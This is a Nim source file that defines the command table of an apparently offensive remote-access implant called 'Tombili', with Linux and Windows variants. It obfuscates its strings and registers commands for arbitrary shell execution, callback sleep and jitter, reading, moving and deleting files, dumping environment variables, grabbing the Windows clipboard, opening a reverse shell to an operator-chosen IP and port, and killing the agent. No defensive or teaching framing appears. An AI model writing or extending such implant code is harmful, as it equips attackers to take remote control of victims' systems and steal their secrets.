import json

import shared
import utils

when defined(linux):
    import linux

when defined(windows):
    import windows

type
    CommandArgument* = object
        name*: string
        arg_type*: string
        description: string
        required: bool

    Command* = object
        command*: string
        description*: string
        args*: seq[CommandArgument]
        function*: proc(task: JsonNode): string

var commands*: seq[Command] = @[]

# Load commands
when defined(linux):
    # shell
    commands.add(
        Command(
            command: obf("shell"), 
            description: obf("Run a command on the system using /bin/sh"),
            args: @[
                CommandArgument(name: obf("command"), arg_type: obf("str"), description: obf("The command to run"), required: true)
            ],
            function: linux.shell
        )
    )

    # getsleep
    commands.add(
        Command(
            command: obf("getsleep"), 
            description: obf("Get the current sleep time"),
            args: @[],
            function: shared.getSleep
        )
    )

    # setsleep
    commands.add(
        Command(
            command: obf("setsleep"), 
            description: obf("Set the sleep time between callbacks"),
            args: @[
                CommandArgument(name: obf("sleep"), arg_type: obf("float"), description: obf("Seconds to sleep for"), required: true),
                CommandArgument(name: obf("jitter"), arg_type: obf("float"), description: obf("Seconds of jitter"), required: true)
            ],
            function: shared.setSleep
        )
    )

    # whoami
    commands.add(
        Command(
            command: obf("whoami"),
            description: obf("Get the user that Tombili is running as"),
            args: @[],
            function: linux.whoami
        )
    )

    # cat 
    commands.add(
        Command(
            command: obf("cat"),
            description: obf("Read the contents of a file"),
            args: @[
                CommandArgument(name: obf("path"), arg_type: obf("str"), description: obf("The absolute path of the file to read"), required: true)
            ],
            function: shared.cat
        )
    )

    # fileinfo 
    commands.add(
        Command(
            command: obf("fileinfo"),
            description: obf("Get information about a file"),
            args: @[
                CommandArgument(name: obf("path"), arg_type: obf("str"), description: obf("The absolute path of the file"), required: true)
            ],
            function: shared.fileinfo
        )
    )

    # mv 
    commands.add(
        Command(
            command: obf("mv"),
            description: obf("Move a file or directory"),
            args: @[
                CommandArgument(name: obf("source"), arg_type: obf("str"), description: obf("The source file or directory"), required: true),
                CommandArgument(name: obf("destination"), arg_type: obf("str"), description: obf("The destination file or directory"), required: true)
            ],
            function: shared.mv
        )
    )

    # rm 
    commands.add(
        Command(
            command: obf("rm"),
            description: obf("Delete a file"),
            args: @[
                CommandArgument(name: obf("path"), arg_type: obf("str"), description: obf("The absolute path of the file to delete"), required: true)
            ],
            function: shared.rm
        )
    )

    # getenv
    commands.add(
        Command(
            command: obf("getenv"), 
            description: obf("Get all environemnt variables"),
            args: @[],
            function: shared.getEnv
        )
    )

    # reverseshell
    commands.add(
        Command(
            command: obf("reverseshell"),
            description: obf("Start a reverse shell"),
            args: @[
                CommandArgument(name: obf("ip"), arg_type: obf("str"), description: obf("The IP to connect to"), required: true),
                CommandArgument(name: obf("port"), arg_type: obf("int"), description: obf("The port to connect to"), required: true)
            ],
            function: shared.reverseShell
        )
    )

    # pid
    commands.add(
        Command(
            command: obf("pid"),
            description: obf("Get the id of the current process"),
            args: @[],
            function: shared.pid
        )
    )

    # kill 
    commands.add(
        Command(
            command: obf("kill"),
            description: obf("Kill the agent"),
            args: @[],
            function: shared.kill
        )
    )

when defined(windows):
    # shell
    commands.add(
        Command(
            command: obf("shell"), 
            description: obf("Run a command on the system using cmd"),
            args: @[
                CommandArgument(name: obf("command"), arg_type: obf("str"), description: obf("The command to run"), required: true)
            ],
            function: windows.shell
        )
    )

    # getsleep
    commands.add(
        Command(
            command: obf("getsleep"), 
            description: obf("Get the current sleep time"),
            args: @[],
            function: shared.getSleep
        )
    )

    # setsleep
    commands.add(
        Command(
            command: obf("setsleep"), 
            description: obf("Set the sleep time between callbacks"),
            args: @[
                CommandArgument(name: obf("sleep"), arg_type: obf("float"), description: obf("Seconds to sleep for"), required: true),
                CommandArgument(name: obf("jitter"), arg_type: obf("float"), description: obf("Seconds of jitter"), required: true)
            ],
            function: shared.setSleep
        )
    )

    # whoami
    commands.add(
        Command(
            command: obf("whoami"),
            description: obf("Get the user that Tombili is running as"),
            args: @[],
            function: windows.whoami
        )
    )

    # msgbox
    commands.add(
        Command(
            command: obf("msgbox"), 
            description: obf("Display a message box"),
            args: @[
                CommandArgument(name: obf("title"), arg_type: obf("str"), description: obf("The title of the message box"), required: true),
                CommandArgument(name: obf("body"), arg_type: obf("str"), description: obf("The body of the message box"), required: true)
            ],
            function: windows.msgBox
        )
    )

    # cat 
    commands.add(
        Command(
            command: obf("cat"),
            description: obf("Read the contents of a file"),
            args: @[
                CommandArgument(name: obf("path"), arg_type: obf("str"), description: obf("The absolute path of the file to read"), required: true)
            ],
            function: shared.cat
        )
    )

    # fileinfo 
    commands.add(
        Command(
            command: obf("fileinfo"),
            description: obf("Get information about a file"),
            args: @[
                CommandArgument(name: obf("path"), arg_type: obf("str"), description: obf("The absolute path of the file to read"), required: true)
            ],
            function: shared.fileinfo
        )
    )

    # mv 
    commands.add(
        Command(
            command: obf("mv"),
            description: obf("Move a file or directory"),
            args: @[
                CommandArgument(name: obf("source"), arg_type: obf("str"), description: obf("The source file or directory"), required: true),
                CommandArgument(name: obf("directory"), arg_type: obf("str"), description: obf("The destination file or directory"), required: true)
            ],
            function: shared.mv
        )
    )

    # rm 
    commands.add(
        Command(
            command: obf("rm"),
            description: obf("Delete a file"),
            args: @[
                CommandArgument(name: obf("path"), arg_type: obf("str"), description: obf("The absolute path of the file to delete"), required: true)
            ],
            function: shared.rm
        )
    )

    # getenv
    commands.add(
        Command(
            command: obf("getenv"), 
            description: obf("Get all environemnt variables"),
            args: @[],
            function: shared.getEnv
        )
    )

    # getclipboard
    commands.add(
        Command(
            command: obf("getclipboard"),
            description: obf("Get the contents of the clipboard"),
            args: @[],
            function: windows.getClipboard
        )
    )

    # reverseshell
    commands.add(
        Command(
            command: obf("reverseshell"),
            description: obf("Start a reverse shell"),
            args: @[
                CommandArgument(name: obf("ip"), arg_type: obf("str"), description: obf("The IP to connect to"), required: true),
                CommandArgument(name: obf("port"), arg_type: obf("int"), description: obf("The port to connect to"), required: true)
            ],
            function: shared.reverseShell
        )
    )

    # pid
    commands.add(
        Command(
            command: obf("pid"),
            description: obf("Get the id of the current process"),
            args: @[],
            function: shared.pid
        )
    )

    # kill 
    commands.add(
        Command(
            command: obf("kill"),
            description: obf("Kill the agent"),
            args: @[],
            function: shared.kill
        )
    )
